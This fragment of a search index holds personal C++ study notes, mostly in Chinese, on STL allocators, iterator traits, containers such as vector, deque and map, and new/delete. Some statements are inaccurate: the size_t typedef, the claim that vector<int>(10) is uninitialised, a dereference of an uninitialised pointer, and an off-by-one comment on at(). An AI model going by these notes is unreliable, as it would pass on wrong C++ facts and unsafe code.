\u89c6\u4e3a\u8db3\u591f\u5927\uff0c\u76f4\u63a5\u4f7f\u7528\u4e00\u7ea7\u914d\u7f6e\u5668\uff0c\u5c0f\u4e8e128bytes\u65f6\u89c6\u4f5c\u8fc7\u5c0f\uff0c\u4f7f\u7528memory pool\u8fdb\u884c\u6574\u7406</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\u53cc\u5c42\u914d\u7f6e\u5668alloc\u662f\u4e0d\u7b26\u5408STL\u7684\u5206\u914d\u5668\u7684\u6807\u51c6\u7684\uff0c\u56e0\u6b64\u4f1a\u5bf9\u9f50\u8fdb\u884c\u4e00\u5b9a\u7684\u5c01\u88c5\uff0c\u4f7f\u5176\u7b26\u5408\u6807\u51c6\u63a5\u53e3\u3002\u5c01\u88c5\u91cc\u6ca1\u6709\u4ec0\u4e48\u503c\u5f97\u7ec6\u8bf4\u7684\uff0c\u90fd\u662f\u76f4\u63a5\u8f6c\u8c03\u7528\u3002</p> <ul> <li>\u4e00\u7ea7\u914d\u7f6e\u5668\u89c1P90</li> <li>\u4e8c\u7ea7\u914d\u7f6e\u5668\u89c1P94</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#iterator","title":"iterator","text":"<p>It is one kind of the class template which overloads the operator* operator++ operator-&gt;</p> <p>iterator and algorithm</p> <pre><code>::sort(c.begin(),c.end());\n</code></pre> <p>generic programming \u628a\u6570\u636e\u548c\u65b9\u6cd5\u5206\u5f00\u6765\uff0c\u90a3\u4e48\u8981\u60f3\u628acontainer\u548calgorithm\u8054\u7cfb\u5728\u4e00\u8d77\uff0c\u5c31\u9700\u8981iterator\u8fed\u4ee3\u5668 \u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0csort\u5e76\u4e0d\u5c01\u88c5\u5728 vector,deque \u7b49\u5bb9\u5668\u4e2d\uff0c\u4ed6\u4eec\u81ea\u8eab\u4e5f\u6ca1\u6709\u81ea\u5df1\u7684sort\u51fd\u6570\uff0c\u56e0\u6b64\u53ea\u80fd\u7528\u4ed6\u4eec\u7684\u8fed\u4ee3\u5668\u53bb\u52a0\u5165sort</p> <p>\u4f18\u52bf\u5728\u4e8e\u53ea\u8981\u597d\u597d\u5229\u7528\u6a21\u677f\u548c\u64cd\u4f5c\u7b26\u91cd\u8f7d\uff0c\u7b97\u6cd5\u65b9\u9762\u5c31\u53ef\u4ee5\u95ed\u95e8\u9020\u53e5bushi</p> <p>\u4f46\u662f\u5f53\u64cd\u4f5c\u7b26\u91cd\u8f7d\u4e5f\u65e0\u6cd5\u5c06\u5176\u5b9e\u73b0\u7b97\u6cd5\u590d\u7528\u7684\u65f6\u5019\uff0c\u6216\u8005\u8bf4\u8fd9\u4e2a\u5bb9\u5668\u7684\u7279\u6027\u4f7f\u5f97\u5176\u6709\u4f18\u79c0\u5f88\u591a\u7684\u7b97\u6cd5\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5728\u5bb9\u5668\u5185\u90e8\u5185\u7f6e\u4e00\u4e2a\u7b97\u6cd5 \u6bd4\u5982list\u7684sort list\u63d0\u4f9b\u7684\u8fed\u4ee3\u5668\u6709\u4e00\u5b9a\u7684\u6761\u4ef6\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f7f\u7528\u5168\u5c40\u7684sort</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#some-definitions-in-stl","title":"some definitions in STL","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#stdsize_t","title":"std::size_t","text":"<pre><code>typedef unsigned_int size_t\n</code></pre> <p>\u662f\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u4f5c\u4e3asizeof\u8fd0\u7b97\u7b26\u7684\u8fd4\u56de\u503c\uff0c\u672c\u8d28\u4e0a\u5c31\u5f53\u4e00\u4e2a\u65e0\u7b26\u53f7\u6570\u4f7f\u7528\u5c31\u597d\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u8981\u8868\u793a\u5b57\u6bb5\u7684\u957f\u5ea6\u7684\u65f6\u5019\uff0c\u6700\u597d\u4f7f\u7528size_t\u4ee3\u66ffint</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#stdptrdiff_t","title":"std::ptrdiff_t","text":"<p>\u200b<code>typedef long signed_int ptrdiff_t</code>\u200b \u662f\u6709\u7b26\u53f7\u5e38\u6574\u5f62\uff0c\u7528\u6765\u8868\u793a\u6307\u9488\u7684\u51cf\u6cd5\u7ed3\u679c</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#iteration","title":"iteration","text":"<p>\u8fed\u4ee3\u5668\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u6307\u9488\u7684\u5bf9\u8c61\uff0c\u5b83\u6700\u57fa\u7840\u7684\u529f\u80fd\u5c31\u662f\u5bf9<code>operator* and operator-&gt;</code>\u200b\u8fdb\u884c\u91cd\u8f7d\u3002</p> <p>\u5bf9\u4e8e\u8fd9\u4e00\u70b9\uff0cC++\u63d0\u4f9b\u7684\u5e93\u91cc\u9762\u6709\u4e00\u4e2a\u7c7b\u4f3c\u7684\u4e1c\u897f <code>auto_ptr</code>\u200b \u4e3b\u8981\u7528\u6765\u9632\u6b62\u4f7f\u7528\u539f\u751f\u6307\u9488\u5e26\u6765\u7684\u5185\u5b58\u6f0f\u6d1e</p> <pre><code>//auto_ptr \u7684\u4f7f\u7528\u65b9\u6cd5\nauto_ptr&lt;string&gt; ps(new string(\"hello\"));\n</code></pre> <p>\u8fed\u4ee3\u5668\u5728\u5bb9\u5668\u548c\u7b97\u6cd5\u4e4b\u95f4\u5145\u5f53\u7c98\u5408\u5242\u7684\u4f5c\u7528\u3002</p> <p>\u6cdb\u578b\u601d\u60f3</p> <p>\u60f3\u8981\u8ba9\u8fed\u4ee3\u5668\u4ee3\u66ff\u6307\u9488\u505a\u6240\u505a\u7684\u5de5\u4f5c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e9b\u5176\u4ed6\u7684\u5185\u5bb9\u3002</p> <p>\u5f53\u6211\u4eec\u4f7f\u7528\u4e00\u4e2aint\u6307\u9488\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u5730\u505a\u8fd9\u6837\u7684\u5de5\u4f5c</p> <pre><code>int* x;\nint y=5;\n*x=y;\n</code></pre> <p>\u56e0\u4e3a\u6211\u4eec\u5f88\u5bb9\u6613\u5f97\u77e5\u9053int* \u6307\u4ee3\u7684\u5bf9\u8c61\u662fint</p> <p>\u4f46\u662f\u5728\u6cdb\u578b\u4e4b\u4e2d\uff0c\u6211\u4eec\u5f88\u96be\u4ee5\u77e5\u9053\u4ee5\u5982\u4e0b\u5f62\u5f0f\u88ab\u4f20\u5165\u7684\u8fed\u4ee3\u5668\u6240\u6307\u7684\u5bf9\u8c61\u7c7b\u578b\u662f\u4ec0\u4e48</p> <pre><code>template&lt;class I&gt;\nvoid func(I itor){...}\n</code></pre> <p>\u56e0\u6b64\u6211\u4eec\u7684\u64cd\u4f5c\u5c31\u4f1a\u53d7\u5230\u9650\u5236</p> <p>\u5982\u4f55\u83b7\u53d6\u8fed\u4ee3\u5668\u6240\u6307\u5bf9\u8c61\u7684\u7c7b\u578b</p> <pre><code>template&lt;class I,class T&gt;\nvoid func_real(I itor,T item){\n    T object_we_need;\n    //...\n}\ntemplate&lt;class I&gt;\nvoid func(I itor){\n    func_real(itor, *itor);\n}\n</code></pre> <p>\u5229\u7528\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u63a8\u5bfc\u6cdb\u578b\u7684\u7c7b\u578b\u7684\u6027\u8d28\uff0c\u628a\u539f\u672c\u8981\u5728func\u91cc\u505a\u7684\u5de5\u4f5c\u5ac1\u63a5\u5230func_real \u4e0a</p> <p>\u4f46\u662f\u4ec5\u4ec5\u5982\u4e0a\u7684\u64cd\u4f5c\u662f\u4e0d\u8db3\u591f\u652f\u6491\u8fed\u4ee3\u5668\u53bb\u53d6\u4ee3\u6307\u9488\u7684\u3002\u8fd9\u4e2aT\u4f5c\u4e3afunc\u51fd\u6570\u7684\u8fd4\u56de\u503c\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898</p> <p>partial specialization</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u6cdb\u578b\u7c7b\u6216\u51fd\u6570\u800c\u8a00\u6211\u4eec\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u4e00\u4e2a\u7279\u5316</p> <pre><code>template&lt;class T&gt;\nclass A{...}\ntemplate&lt;class T&gt;\nclass A&lt;T*&gt; {...}  //\u5f53\u4e14\u4ec5\u5f53T\u4e3a\u539f\u751f\u6307\u9488\u65f6\n</code></pre> <p>\u7531\u8fd9\u9879\u7279\u6027\uff0c\u6211\u4eec\u884d\u751f\u51fa\u4e00\u9879\u64cd\u4f5c</p> <pre><code>template&lt;class I&gt;\nstruct iterator_traits{\n    typedef typename I::value_type value_type;\n};\n</code></pre> <p>\u5176\u610f\u601d\u4e3a\u5982\u679cI\u7c7b\u578b\u6709\u5b9a\u4e49value_type \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5176\u201c\u8403\u53d6\u201d\u51favalue_type</p> <p>\u5176\u53ef\u4ee5\u5e94\u7528\u5728\u5bf9\u8fed\u4ee3\u5668\u7684\u64cd\u4f5c\u4e2d\uff0c\u4f8b\u5982</p> <pre><code>template&lt;class I&gt;\ntypename iterator_traits&lt;I&gt;::value_type func(I itor){\n    return *itor;\n}\n</code></pre> <p>\u4e0a\u9762\u6709\u4e2a\u5f88\u957f\u7684\u5f0f\u5b50\u7528\u6765\u8868\u793a\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u610f\u601d\u662f\u5982\u679cI\u5b58\u5728value_type\u7684\u5b9a\u4e49\uff0c\u90a3\u4e48\u5c31\u4f9d\u8d56I\u7684value_type\u7684\u5b9a\u4e49\u4f5c\u4e3a\u51fd\u6570\u7684\u8fd4\u56de\u503c \u6709\u6548\u89e3\u51b3\u4e86\u6211\u4eec\u5728\u4f7f\u7528\u6cdb\u578b\u7684\u65f6\u5019\uff0c\u65e0\u6cd5\u8bbf\u95ee\u8fed\u4ee3\u5668\u6240\u6307\u5411\u5185\u5bb9\u7684\u56f0\u5883\u3002</p> <p>\u66f4\u597d\u7684\u662f\uff0c\u8be5\u60c5\u51b5\u80fd\u591f\u517c\u5bb9\u539f\u751f\u6307\u9488</p> <pre><code>template&lt;class I&gt;\nstruct iterator_traits&lt;I*&gt;{\n    typedef I value_type;\n};\n</code></pre> <p>\u4e0a\u8ff0\u7248\u672c\u662f\u4e00\u4e2apartial specialization\u7684\u7248\u672c\uff0c\u610f\u601d\u662f\u5982\u679c\uff08I*\uff09\u662f\u4e2a\u539f\u751f\u6307\u9488\uff0c\u90a3\u4e48\u76f4\u63a5\u5c06I\u4f5c\u4e3avalue_type</p> <p>\u8981\u4f7f\u5f97\u6211\u4eec\u7684\u8fed\u4ee3\u5668\u5728\u6cdb\u578b\u6761\u4ef6\u4e0b\u6b63\u5e38\u5de5\u4f5c\uff0c\u6211\u4eec\u9700\u8981\u5b9a\u4e49\u4e94\u4e2a\u76f8\u5e94\u7c7b\u578b</p> <pre><code>value_type;  //\u8fed\u4ee3\u5668\u6307\u5411\u5bf9\u8c61\u7684\u7c7b\u578b\ndifference_type;\npointer;\nreference;\niterator_category;\n</code></pre> <p>difference type</p> <p>\u8868\u793a\u8fed\u4ee3\u5668\u4e4b\u95f4\u7684\u8ddd\u79bb</p> <p>reference type</p> <p>\u987e\u540d\u601d\u4e49\u662f\u548creference\u6709\u5173\u7684\u7c7b\u578b</p> <p>\u5bf9\u4e8e\u4e0d\u662fconst\u7684\u6307\u9488\uff0c\u6211\u4eec\u5e94\u5f53\u53ef\u4ee5\u6539\u53d8\u5176\u6240\u6307\u5411\u7684\u5bf9\u8c61\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u5176operator* \u6240\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u5e94\u5f53\u53ef\u4ee5\u505a\u5de6\u503c \u6240\u4ee5\u5176\u5e94\u5f53\u8fd4\u56de \u8be5\u6307\u9488\u6307\u5411\u5bf9\u8c61\u7684reference type\uff1b</p> <pre><code>\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#string","title":"string","text":"<p>\u5b57\u7b26\u4e32\u7684\u8fd0\u7b97\u7b26\u91cd\u8f7d</p> <p>\u5b50\u5b57\u7b26\u4e32\u67e5\u627e\uff0c\u622a\u53d6\uff0c\u66ff\u6362</p> <p>to_string();</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#array","title":"array","text":"<p>array\u662fc++11\u9488\u5bf9\u539f\u6709\u7684\u6570\u7ec4\u8fdb\u884c\u4e86\u5bb9\u5668\u5316\u7684\u64cd\u4f5c\u4ea7\u751f\u7684\u65b0\u7684\u5bb9\u5668\u7c7b\u578b\uff0c\u5176\u672c\u8eab</p> <p>\u6784\u9020\u51fd\u6570</p> <pre><code>array&lt;\u6570\u636e\u7c7b\u578b,\u957f\u5ea6&gt; arr={1,2,3,4...};\n\u957f\u5ea6\u548c\u5185\u7f6e\u7684\u6570\u7ec4\u4e00\u6837\uff0c\u5fc5\u987b\u662f\u4e00\u4e2a\u5e38\u6570\n</code></pre> <p>\u8fed\u4ee3\u5668\u8fd4\u56de</p> <pre><code>arr.begin()//\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668\narr.end()\narr.cbegin();//\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684const\u7684\u8fed\u4ee3\u5668\narr.cend();\n</code></pre> <p>\u65b9\u6cd5</p> <pre><code>arr.size();\narr.max_size();\narr.empty();//\u5982\u540d\u5b57\u6240\u793a\narr.fill()//\u8bbe\u7f6e\u6240\u6709\u5143\u7d20\u7684\u503c arr.fill(5)\u662f\u6307\u5c06\u6240\u6709\u5143\u7d20\u8d4b\u503c\u4e3a5\narr.swap(); //\u4ea4\u6362\u5bb9\u5668\u7684\u5185\u5bb9 \u4f7f\u7528\u65b9\u5f0farr.swap(arr1) \u4ea4\u6362\u53cc\u65b9\u7684\u5168\u90e8\u6570\u503c\uff0c\n\u5e76\u4e14\u53cc\u65b9\u7684array\u5fc5\u987b\u62e5\u6709\u76f8\u540c\u7684\u957f\u5ea6\u548c\u76f8\u540c\u7684\u6570\u636e\u7c7b\u578b\n</code></pre> <p>\u6570\u636e\u8bbf\u95ee</p> <pre><code>arr[2];\narr.at(2);/\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u5143\u7d20\u7684\u5f15\u7528\narr.front();//\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u5f15\u7528\narr.back();//\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u5f15\u7528\narr.data();//\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u6307\u9488\n</code></pre> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#string_1","title":"string","text":"<p>substr()</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#stack","title":"stack","text":"<pre><code>stack&lt;int&gt; myst;\nmyst.pop();\nmyst.push();\nmyst.top();\nmyst.empty();\nmyst.size();\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#vector","title":"vector","text":"<p>\u6784\u9020\u65b9\u6cd5</p> <pre><code>vector&lt;int&gt; a(10);//a\u4f1a\u670910\u4e2a\u5143\u7d20\uff0c\u4f46\u6bcf\u4e00\u4e2a\u5143\u7d20\u7684\u521d\u59cb\u503c\u4e0d\u786e\u5b9a\nvector&lt;int&gt; a={1,2,3,54,8,565,62,1,8,8};\nvector&lt;int&gt; a(10,1);//a\u6709\u5341\u4e2a\u5143\u7d20\uff0c\u4e14\u5747\u4e3a1\nvector&lt;int&gt; a(b);//b\u4e3a\u4e00vector a\u4e0eb\u5b8c\u5168\u76f8\u540c\nvector&lt;int&gt; a(b.begin(),b.begin()+5);//a\u7684\u5185\u5bb9\u4e3ab\u7684\u524d\u4e94\u4e2a\u6570\u636e\nvector&lt;int&gt; a(b,b+7);//a\u7684\u5185\u5bb9\u4e3ab\u7684\u524d\u4e03\u4e2a\u6570\u636e\uff0cb\u4e3a\u6570\u7ec4\n</code></pre> <p>\u8fed\u4ee3\u5668</p> <pre><code>vec.begin()\nvec.end()\nvec.cbegin()\nvec.cend()\n</code></pre> <p>\u64cd\u4f5c\u65b9\u6cd5</p> <p>vector \u7684push_back()\u9700\u8981\u6269\u5f20\u7a7a\u95f4\u7684\u65f6\u5019\uff0c\u4e00\u822c\u7684\u505a\u6cd5\u662f\u4e24\u500d\u6269\u5927</p> <pre><code>vec.size()//\u6709\u591a\u5c11\u4e2a\u5143\u7d20\nvec.max_size()//\u6574\u4e2a\u7cfb\u7edf\u80fd\u7ed9\u6211\u4eec\u7684vector\u591a\u5c11\u7a7a\u95f4\n\n\nvec.resize(n)//\u5c06vector\u91cc\u7684size\u4fee\u6539\u4e3an\uff0c\u8fd9\u91cc\u6709\u4e09\u79cd\u60c5\u51b5\n//\u5982\u679cn\u5c0f\u4e8e\u539f\u6709\u7684size(),\u90a3\u4e48\u540e\u5e8f\u7684\u6570\u636e\u5c06\u4f1a\u88ab\u9500\u6bc1\uff0c\u4f46\u662fvector\u672c\u8eab\u7684capacity\u4e0d\u53d8\n//\u5982\u679cn\u5927\u4e8e\u539f\u6709\u7684size()\u4f46\u662f\u5c0f\u4e8e\u539f\u5148\u7684capacity\uff0c\u4f1a\u65b0\u589e\u52a0\u5143\u7d20\uff0c\u65b0\u589e\u7684\u5143\u7d20\u90fd\u662f0\n//\u5982\u679cn\u5927\u4e8e\u539f\u6709\u7684capacity\uff0c\u90a3\u4e48size\u548ccapacity\u90fd\u4f1a\u53d8\u4e3an\uff0c\u65b0\u589e\u52a0\u7684\u5143\u7d20\u5747\u4e3a0\n\n\nvec.empty()//\u7a7a\u5219\u8fd4\u56de0\nvec.shrink_to_fit()//\u53bb\u9664\u9884\u7559\u7684\u7a7a\u95f4\uff0c\u4f7f\u5f97capacity\u548csize\u4fdd\u6301\u4e00\u81f4\nvec.capacity()//\u76ee\u524d\u7a7a\u95f4\u6709\u591a\u5927\n\nvec.erase(\u8fed\u4ee3\u5668) \u5220\u9664\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u6570\u636e\n\u8fd4\u56de\u4e0b\u4e00\u4e2a\u6709\u6548\u7684\u8fed\u4ee3\u5668\nvec.erase(\u8fed\u4ee3\u56681\uff0c\u8fed\u4ee3\u56682) \u5220\u9664\u8fed\u4ee3\u56681\u5230\u8fed\u4ee3\u56682\u7684\u6240\u6709\u6570\u636e\nvec.push_back()\nvec.pop_back()\nvec.insert();\nvec.assign()\nvec.swap()\nvec.clear()\nvec.emplace()\nvec.emplace_back()//\u5176\u6548\u679c\u4e0epush_back\u4e00\u6837\uff0c\u4f46\u662f\u5b9e\u73b0\u65b9\u5f0f\u4e0d\u540c\n</code></pre> <p>using insert</p> <pre><code>// method1\nvector&lt;int&gt; vec1;\nint arr[] = { 1,2,3,4,5 };\nvec1.insert(vec1.begin(), arr, arr + 5);     //[1,2,3,4,5]\n\n// method2\nvector&lt;int&gt; vec2(vec1); \nvector&lt;int&gt;::iterator it = vec1.begin() + 2;\nvec1.insert(it, 3, 20);                      // [1,2,20,20,20,3,4,5]\n\n// method3\nvector&lt;int&gt; vec3(3, 40);\nvector&lt;int&gt;::iterator it2 = vec2.begin();\nvec2.insert(it2, vec3.begin(), vec3.end());  // [40,40,40,1,2,3,4,5]\n</code></pre> <p>\u6784\u9020\u51fd\u6570</p> <p>\u8fed\u4ee3\u5668</p> <p>\u65b9\u6cd5</p> <pre><code>list1.sort();//\u8fd9\u4e0d\u662f\u5168\u5c40\u7684sort\uff0c\u800c\u662flist\u79c1\u6709\u7684sort\n</code></pre> <p>\u6784\u9020\u51fd\u6570</p> <p>\u8fed\u4ee3\u5668</p> <p>\u65b9\u6cd5</p> <p>\u53cc\u8fb9\u53ef\u8fdb\u53ef\u51fa\u7684\u6570\u7ec4 vector\u7684\u8fdb\u9636\u7248\uff1f \u672c\u8eab\u7684\u6570\u636e\u7ec4\u7ec7\u5f62\u5f0f\u7c7b\u4f3c\u4e0evector</p> <p>\u5176\u672c\u8eab\u7684\u6570\u636e\u7ec4\u7ec7\u662f\u5206\u6bb5\u8fde\u7eed\u7684\uff0c\u5206\u6210\u4e86\u5f88\u591a\u6bb5\uff0c\u6bcf\u6bb5\u81ea\u8eab\u662f\u8fde\u7eed\u7684\uff0c\u4f46\u662f\u6bb5\u4e0e\u6bb5\u4e4b\u95f4\u662f\u4e0d\u8fde\u7eed\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u8fd8\u662f\u770b\u505a\u662f\u8fde\u7eed\u7684\u5f62\u5f0f\u53bb\u4f7f\u7528 \u672c\u8eab\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u6210\u5458\u7684\u6307\u9488\u53bb\u6307\u5411\u90a3\u6bcf\u4e00\u6bb5\u7684\u6570\u636e</p> <p>deque\u7684\u529f\u80fd\u5176\u5b9e\u6db5\u76d6\u4e86stack\u4ee5\u53caqueue\uff0c\u56e0\u6b64stack\u548cqueue\u5728\u5e95\u5c42\u90fd\u662f\u4f7f\u7528deque\u4f5c\u4e3a\u5b9e\u73b0\u65b9\u6cd5 \u5f88\u591a\u65f6\u5019\u4e5f\u4e0d\u628astack\u548cqueue\u53eb\u505a\u5bb9\u5668\uff0c\u56e0\u4e3a\u5176\u672c\u8eab\u90fd\u662f\u4f9d\u8d56\u4e8edeque\u7684\uff0c\u6240\u4ee5\u4e5f\u628a\u4ed6\u4eec\u53eb\u505aadapter\uff0c\u56e0\u6b64stack\u548cqueue\u4e0d\u4f1a\u7ed9\u51fa\u8fed\u4ee3\u5668</p> <pre><code>//deque\u7684\u4e3b\u8981\u64cd\u4f5c\ndeque&lt;int&gt; mydeq;\nmydeq.push_front();\nmydeq.push_back();\nmydeq.pop_front();\nmydeq.pop_back();\nmydeq.erase(\u8fed\u4ee3\u5668);\nmydeq.erase(\u8fed\u4ee3\u56681,\u8fed\u4ee3\u56682);\n</code></pre> <pre><code>pop\u6ca1\u6709\u8fd4\u56de\u503c\uff1f\n</code></pre> <p>\u200d</p> <p>\u200d</p> <p>\u5e95\u5c42\u5b9e\u73b0\u662f\u7ea2\u9ed1\u6811</p> <p>\u6784\u9020</p> <p>unordered_set se; <p>\u5e95\u5c42\u5b9e\u73b0\u4e5f\u662f\u7ea2\u9ed1\u6811\uff0c\u53ea\u662f\u91cc\u9762\u662f\u4e00\u4e2akey \u4e00\u4e2avalue</p> <p>\u64cd\u4f5c</p> <pre><code>mymap.insert(pair&lt;type1,type2&gt;(key,value))\nauto item=mymap.find(target);\ncout&lt;&lt;item.first&lt;&lt;' '&lt;&lt;item.second&lt;&lt;endl;//first \u7ed9\u51fa\u7684key second \u7ed9\u51fa\u7684value\nmultimap,\u4e0d\u53ef\u4ee5\u7528\u4e0b\u6807\u8fd0\u7b97\u7b26\u4f5c\u4e3ainsert\nmymap[i]=n; \u662f\u4e0d\u53ef\u4ee5\u7684\n</code></pre> <p>\u5e95\u5c42\u5b9e\u73b0\u662f\u6563\u5217\u8868</p> <p>\u6563\u5217\u8868\u91cc\u9762\u6bcf\u4e00\u4e2a\u5730\u65b9\u4f1a\u6302\u6570\u91cf\u4e0d\u5b9a\u7684\u5143\u7d20\uff0c\u4f46\u662f\u5176bucket\u7684\u6570\u91cf\u4e00\u5b9a\u591a\u4e8e\u5176\u672c\u8eab\u627f\u8f7d\u7684\u6570\u636e\u7684\u6570\u91cf\uff0c\u4e5f\u5c31\u662f\u8bf4\u660e\u5176\u4e2d\u662f\u6709\u5f88\u591abucket\u662f\u6ca1\u6709\u627f\u8f7d\u5143\u7d20\u7684 \u5176\u5185\u90e8\u6269\u5145\u7684\u65b9\u6cd5\u4e5f\u662f\u4e24\u500d\u5f0f\u6269\u5145</p> <p>\u64cd\u4f5c</p> <pre><code>mset.insert(\u5143\u7d20);\n</code></pre> <p>\u5e95\u90e8\u4f9d\u65e7\u662f\u7ea2\u9ed1\u6811</p> <p>\u5185\u90e8\u5143\u7d20\u4e0d\u80fd\u91cd\u590d key\u4e0d\u80fd\u91cd\u590d\uff0ckey\u548cvalue\u662f\u76f8\u540c\u7684</p> <p>\u5185\u90e8\u5143\u7d20\u4e0d\u80fd\u91cd\u590d key\u4e0d\u80fd\u91cd\u590d value\u53ef\u4ee5\u91cd\u590d</p> <pre><code>mymap[i]=value; \u53ef\u4ee5\u7528\u6b64\u79cd\u505a\u6cd5\u53bb\u505ainsert\u529f\u80fd\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#c-new-and-delete","title":"C++\u52a8\u6001\u5185\u5b58\u5206\u914d new and delete","text":"<p>new int  ;  new int[10] int myarray =new int [10] Student q=new student();</p> <pre><code>Student *r = new Student [10]; //\u7533\u8bf7\u4e86\u5341\u4e2astudent\u5bf9\u8c61\n//delete r;\ndelete [] r;\n</code></pre> <p>delete\u6709\u4e24\u79cd \u4e00\u79cd\u662fdelete \u4e00\u79cd\u662fdelete[] \u4e00\u822c\u5982\u679c\u5728new\u7684\u65f6\u5019\u5e26\u4e86[] \u90a3\u4e48delete\u7684\u65f6\u5019\u4e5f\u4e00\u822c\u8981\u5e26\u4e0a[] \u5bf9\u4e8ec++\u800c\u8a00\u672c\u8eab\u5c31\u662f\u4e00\u79cd\u8c03\u7528\u5404\u79cd\u5bf9\u8c61\u7684\u6790\u6784\u7684\u4e00\u79cd\u65b9\u5f0f\uff0cint char\u8fd9\u4e9b\u6700\u57fa\u7840\u7684\u4e1c\u897f\u4e5f\u662f\u6709\u6790\u6784\u7684 \u52a0[]\u5c31\u8868\u793a\u8fd9\u4e2a\u4e1c\u897f\u5b83\u672c\u8eab\u6709\u5f88\u591a\u5bf9\u8c61\u5728\u4e00\u5757\uff0c\u9700\u8981\u4e00\u4e2a\u4e2a\u8c03\u7528\u6790\u6784\u51fd\u6570 \u4e00\u4e2a\u4e2a\u8c03\u7528\u6790\u6784\u51fd\u6570\u65f6\u4ece\u540e\u5f80\u524d\u6790\u6784</p> <pre><code>int *a = new int[10];\na++;\ndelete [] a;//\u6b64\u65f6\u5c31\u4f1a\u51fa\u73b0\u8fd0\u884c\u7684\u9519\u8bef \u4efb\u4f55\u52a8\u6001\u5206\u914d\u7684\u5bf9\u8c61\u4e0e\u5176\u5bf9\u5e94\u7684\u5185\u5b58\u4e4b\u95f4\n//\u90fd\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8868\u683c\uff0c\u5982\u679c\u5176\u672c\u8eab\u53d1\u751f\u6539\u53d8\uff0c\u5c31\u65e0\u6cd5\u901a\u8fc7\u8fd9\u4e2a\u8868\u683c\u627e\u5230\u5176\u5bf9\u5e94\u7684\u5185\u5b58\n\n//\u540c\u65f6C++\u5141\u8bb8delete null\u7684\u6307\u9488\nint *p=0;\ndelete p; //\u662f\u4e0d\u4f1a\u62a5\u9519\u7684\uff0c\u5176\u4f59\u60c5\u51b5\u4e0b\uff0cdelete\u53ea\u80fd\u5bf9new\u51fa\u6765\u7684\u7a7a\u95f4\u8fdb\u884c\u64cd\u4f5c\n</code></pre> <p>\u7c7b\u7684\u6790\u6784\u51fd\u6570\uff0c\u8981\u628a\u5728\u7c7b\u8fd0\u884c\u8fc7\u7a0b\u4e2dnew\u51fa\u6765\u7684\u7a7a\u95f4\u8981delete\u6389</p> <pre><code>//\u4e00\u822c\u4f1a\u8fd9\u6837\u64cd\u4f5c\nclass A{\nprivate :\n    int *p;\npublic :\n    